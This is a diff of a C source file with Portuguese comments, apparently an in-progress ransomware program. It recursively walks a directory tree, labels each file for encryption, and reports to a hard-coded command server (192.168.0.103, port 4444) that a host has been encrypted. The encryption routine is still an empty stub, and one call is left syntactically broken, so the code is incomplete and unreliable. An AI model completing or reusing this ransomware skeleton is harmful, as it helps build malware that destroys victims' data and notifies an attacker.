@@ -120,10 +120,10 @@ soquete? (Não em POSIX.1-1996.)
 
 
 */
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <dirent.h> 
+#include <stdio.h>  // Entrada e saida padrao de dados
+#include <stdlib.h> // Biblioteca padrao
+#include <string.h> // Tratar strings
+#include <dirent.h> // Entrada de diretorios
 #include <errno.h> 
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -135,22 +135,20 @@ soquete? (Não em POSIX.1-1996.)
 #include <sys/stat.h>
 #include <sys/types.h>
 
-#define KIBIBYTE = 1024;
+
 #define myhost "192.168.0.103"
 #define myport 4444
 
+
 struct dirent *getdir;
-
-
 //Funçao que avisa o servidor que algum host foi criptografado
 void connectserver();
-//Funçao que faz a criptografia dos nomes de arquivo/diretorio
-void encryptname(char *encryptfile);
 //Funçao que faz a criptografia de arquivos
 void encryptfile(char *encryptfile);
 //Funçao que procura arquivos & diretorios
 void WhatIsDir(char *name_dir);
 
+char blacklist[][40] = {".", "..",".speech-dispatcher","X11"};
 
 //Funçao principal
 int main(int argc, char *argv[]){
@@ -161,7 +159,8 @@ int main(int argc, char *argv[]){
 	}
 
 	WhatIsDir(argv[1]);
-
+	connectserver();
+	
 	return 0;
 }
 
@@ -169,40 +168,42 @@ void WhatIsDir(char *dir_sch){
 	/* Data Type: DIR
 	 * The DIR data type represents a directory stream.
      */
+	struct stat veirify;
 	DIR *diretorio;
-	char concatena[KIBIBYTE];
-	int isdir;
-	struct stat buf;
-	// Function: DIR * opendir (const char *dirname)
+	char pathdir[1024];
 	diretorio = opendir(dir_sch);
-	
+	/*As funções opendir () e fdopendir () retornam um ponteiro para o
+       fluxo de diretório. Em caso de erro, NULL é retornado e errno é definido
+       para indicar o erro.
+	*/
 	if(diretorio == NULL){
-		fprintf(stderr, "[INFO]: Ocorreu um erro ao abrir diretorio: %s\n", dir_sch);;
-		
-	}else{
-		//readdir esta sendo explicada no cabeçalho do codigo!
-		while((getdir = readdir(diretorio)) != NULL){
-			//Verifica se o diretorio guardado na d_name é .. ou .
-			if(strncmp(getdir->d_name, ".", sizeof(getdir->d_name)) == 0 || 
-			strncmp(getdir->d_name, "..", sizeof(getdir->d_name)) == 0) continue;
-			//Concatenando diretorios com arquivos, etc
-
-			memcpy(concatena, dir_sch, sizeof(concatena));
-			strncat(concatena, getdir->d_name,sizeof(concatena));
-			printf("%s\n",concatena);
-
-			//int stat(const char *path, struct stat *buf);
-			stat(concatena, &buf);
-			//As seguintes macros POSIX são definidas para verificar o tipo de arquivo usando o campo st_mode :
-			if(S_ISDIR(buf.st_mode)){
-				strncat(concatena, "/", sizeof(concatena));
-				printf("DIRETORIO--> %s\n", concatena);
-				WhatIsDir(concatena);
-			}else
-				printf("ARQUIVO--> %s\n", concatena);
-		}
-		closedir(diretorio);
+		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n", diretorio);
+		return;
 	}
+	//Lendo entradas de diretorio e guardando na struct dirent getdir
+	while((getdir = readdir(diretorio)) != NULL){
+
+		//Compara o elemento d_name da struct dirent, caso ele seja igual a .. ou . e pula os comandos intermediarios
+		if(strncmp(getdir->d_name,".",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0) continue;
+		if(strncmp(getdir->d_name,".speech-dispatcher",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"X11", sizeof(getdir->d_name)) == 0) continue;
+		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);
+
+		stat(pathdir , &veirify);
+
+		if(S_ISDIR(veirify.st_mode)){
+			
+			strncat(pathdir, "/", sizeof(pathdir)-1);
+			printf("%s\n", pathdir);
+			printf("[ENTRANDO NO DIRETORIO]:  %s\n", getdir->d_name);
+			WhatIsDir(pathdir);
+		}
+		else if(!S_ISLNK(veirify.st_mode)){
+			printf("[CRIPTOGRAFANDO ARQUIVO]:  %s\n", getdir->d_name);
+			encryptfile
+		}
+
+	}
+	closedir(diretorio);
 }
 void connectserver(){
 	int sockfd;
@@ -225,7 +226,10 @@ void connectserver(){
 	}
 	send(sockfd, buffer, sizeof(buffer), 0);
 }
+
 void encryptfile(char *name_dir){
-	//RETURN 0;
+	int len = sizeof(getdir->d_name);
+	
+	
 }
 
